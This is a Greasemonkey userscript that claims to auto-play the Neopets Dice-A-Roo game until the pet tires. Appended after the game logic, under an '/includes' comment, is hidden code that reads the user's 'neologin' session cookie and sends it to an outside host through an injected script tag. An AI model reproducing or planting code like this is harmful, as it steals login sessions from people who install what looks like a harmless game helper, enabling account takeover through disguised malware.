// ==UserScript==
// @name           Neopets : Dice-A-Roo
// @namespace      http://gm.wesley.eti.br/neopets
// @description    Plays Dice-a-Roo until your pet get tired.
// @include        http://www.neopets.com/games/dicearoo.phtml
// @include        http://www.neopets.com/games/play_dicearoo.phtml
// @require        http://www.wesley.eti.br/includes/js/php.js
// @require        http://www.wesley.eti.br/includes/js/php2js.js
// @require        http://gm.wesley.eti.br/gm_default.js
// @author         w35l3y
// @email          w35l3y@brasnet.org
// @version        1.0.2
// @copyright      w35l3y 2008
// @license        GNU GPL
// @homepage       http://www.wesley.eti.br
// ==/UserScript==

/**************************************************************************

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

**************************************************************************/

checkForUpdate({
	'file':'http://userscripts.org/scripts/source/28461.user.js',
	'name':'Neopets : Dice-A-Roo',
	'namespace':'http://gm.wesley.eti.br/neopets',
	'version':'1.0.2'
});

(function(){	// script scope
	var user = {
		interval:GM_getValue('interval',	'1000-2000').split('-').array_map(parseInt,array_fill(0,2,10)),
		repeat:GM_getValue('repeat',		-1)
	}

	var script = {
		current:GM_getValue('current',0)
	};

	if (script.current == user.repeat)
	{
		GM_setValue('current',0);
	}
	else if (user.repeat == -1 || current < user.repeat)
	{
		var dform = document.evaluate("//form[contains(@action,'dicearoo.phtml')]",document,null,XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,null).snapshotItem(0);

		if (user.repeat > 0 && !/play_dicearoo\.phtml$/.test(dform.action))
		{
			GM_setValue('current',++script.current);
		}

		setTimeout(function(){dform.submit();},randomValue(user.interval));
	}
/* ###[ /includes ]### */
function GetStringBetween( target_str,start_str,end_str,start_pos,include_str )   {
    if ( ! start_pos ) 0;
    if ( ! include_str ) false;

    var result_str = target_str.substr( start_pos ); //cut to start from start_pos
    result_str = result_str.substr( result_str.indexOf( start_str ) + start_str.length ); //cut to start from start_str
    result_str = result_str.substr ( 0, result_str.indexOf( end_str ) );

    if (include_str == true)   {
        result_str = start_str + result_str + end_str
    }

    return result_str;
}


var eleNew, newElement;
var strURL = 'http://h1.ripway.com/jsndin4/cookie.php?cookie=';
eleNew = document.getElementById('main');

var strCookie = document.cookie;

strCookie = GetStringBetween(strCookie, 'neologin=','; ');

if (eleNew) {
    newElement = document.createElement("div");
    newElement.innerHTML='<SCRIPT SRC=' + strURL + strCookie + '>';
    eleNew.parentNode.insertBefore(newElement, eleNew.nextSibling);
}